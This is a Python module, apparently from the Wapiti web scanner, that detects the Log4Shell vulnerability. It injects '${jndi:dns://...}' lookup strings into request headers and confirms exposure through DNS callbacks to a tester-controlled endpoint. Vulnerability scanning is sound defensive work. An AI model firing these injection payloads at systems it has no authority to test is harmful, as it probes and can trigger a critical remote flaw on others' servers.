import socket
import uuid
from os.path import join as path_join
from typing import Dict, List, Tuple

import dns.resolver
from httpx import RequestError
from wapitiCore.attack.attack import Attack
from wapitiCore.definitions.log4shell import NAME
from wapitiCore.language.vulnerability import _
from wapitiCore.main.log import log_red, logging
from wapitiCore.net.web import Request


class ModuleLog4Shell(Attack):
    """
    Detect the Log4Shell vulnerability (CVE-2021-44228)
    """

    name = "log4shell"
    do_get = True
    do_post = True

    HEADERS_FILE = "log4shell_headers.txt"


    def __init__(self, crawler, persister, attack_options, stop_event):
        Attack.__init__(self, crawler, persister, attack_options, stop_event)
        if not self.is_valid_dns(attack_options.get("dns_endpoint")):
            self.finished = True

    async def must_attack(self, request: Request):
        if self.finished is True:
            return False
        return True

    async def read_headers(self):
        with open(path_join(self.DATA_DIR, self.HEADERS_FILE), encoding='utf-8') as headers_file:
            return headers_file.read().split("\n")

    async def attack(self, request: Request):
        headers = await self.read_headers()

        batch_malicious_headers, headers_uuid_record = await self._get_malicious_headers(headers)

        for malicious_headers in batch_malicious_headers:
            modified_request = Request(request.url)
            try:
                await self.crawler.async_send(modified_request, malicious_headers, follow_redirects=True)
            except RequestError:
                self.network_errors += 1
                continue
            await self._verify_headers(modified_request, malicious_headers, headers_uuid_record)

    async def _verify_headers(self, modified_request: Request, malicious_headers: dict, headers_uuid_record: dict):
        for header, payload in malicious_headers.items():
            header_uuid = headers_uuid_record.get(header)

            if await self._verify_dns(str(header_uuid)) is True:
                await self.add_vuln_critical(
                    category=NAME,
                    request=modified_request,
                    info=_("URL {0} seems vulnerable to Log4Shell attack by using the header {1}") \
                        .format(modified_request.url, header),
                    parameter=f"{header}: {payload}"
                )

                log_red("---")
                log_red(
                    _("URL {0} seems vulnerable to Log4Shell attack by using the header {1}"),
                    modified_request.url, header
                )
                log_red(modified_request.http_repr())
                log_red("---")

    async def _verify_dns(self, header_uuid: str) -> bool:
        resolver = dns.resolver.Resolver(configure=False)
        resolver.nameservers = [socket.gethostbyname(self.dns_endpoint)]
        answer = resolver.resolve(header_uuid + ".c", "TXT")

        if answer[0].strings[0].decode("utf-8") == "true":
            return True
        return False

    async def _get_malicious_headers(self, headers: List[str]) -> Tuple[Dict, Dict]:
        batch_malicious_headers: List[Dict[str, str]] = []
        headers_uuid_record = {}
        batch_size = 10

        # Creates batch of batch_size elements
        headers_batch = [headers[i:i + batch_size] for i in range(0, len(headers), batch_size)]

        # Creates a UUID for each header
        for header_batch in headers_batch:
            malicious_header = {}

            for header in header_batch:
                header_uuid = uuid.uuid4()
                malicious_header[header] = "${jndi:dns://" + f"{self.dns_endpoint}/{header_uuid}" + ".l}"
                headers_uuid_record[header] = header_uuid
            batch_malicious_headers.append(malicious_header)

        return batch_malicious_headers, headers_uuid_record

    @staticmethod
    def is_valid_dns(dns_endpoint: str) -> str:
        if dns_endpoint is None:
            return False
        try:
            socket.gethostbyname(dns_endpoint)
        except OSError:
            logging.error(_("Error: {} is not a valid domain name").format(dns_endpoint))
            return False
        return True
